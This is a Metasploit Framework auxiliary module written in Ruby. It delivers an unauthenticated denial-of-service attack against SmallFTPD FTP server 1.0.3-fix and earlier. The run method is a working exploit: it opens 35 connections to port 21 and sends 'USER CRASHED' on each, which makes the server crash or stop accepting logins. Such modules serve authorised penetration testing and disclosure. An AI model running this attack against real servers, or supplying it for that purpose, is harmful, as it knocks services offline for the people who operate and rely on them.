##
# $Id$
##


##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp				
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'smallFTPD FTP Server Connection Saturation Remote Denial of Service',
      'Description'	=> %q{
        This module triggers unauthenticated Denial-of-Service condition in SmallFTPD server versions 1.0.3-fix and earlier with a few dozens of connection requests. The vulnerability is probably concerned with smallftpd being unable to handle multiple connections regardless of its maximum connection settings. Upon successful DoS exploit, the smallftpd will crash or still seem functioning by showing its service banner. But in fact it stops rejecting new FTP login requests.
      },
      'Author' 		=> [ 'Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>' ],
      'License'        	=> MSF_LICENSE,
      'Version'        	=> '$Revision$',
      'References'     =>
        [
          [ 'URL', 'http://smallftpd.sf.net/' ],
          [ 'URL', 'http://core.yehg.net/lab/pr0js/advisories/smallftpd_103-fix_saturation_dos' ]
        ],
      'DisclosureDate' => 'Jun 27 2010'))

      register_options(
        [
          Opt::RPORT(21)
        ],self.class)
  end

  def run

    print_status("Sending DOS Packets ...")
    
    35.times do |x|
      connect
      sock.put("USER CRASHED\r\n")			
      disconnect
    end
    
    print_good("Done")			

  end

end

